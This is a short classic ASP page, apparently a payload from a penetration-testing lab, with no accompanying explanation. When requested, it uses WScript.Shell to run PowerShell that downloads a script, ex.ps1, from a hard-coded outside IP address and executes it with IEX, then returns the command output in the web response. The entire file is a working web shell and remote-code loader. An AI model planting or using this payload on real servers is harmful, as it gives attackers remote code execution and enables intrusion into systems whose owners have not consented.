<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://10.10.14.9:80/ex.ps1')")
o = cmd.stdOut.Readall()
Response.write(o)
%>
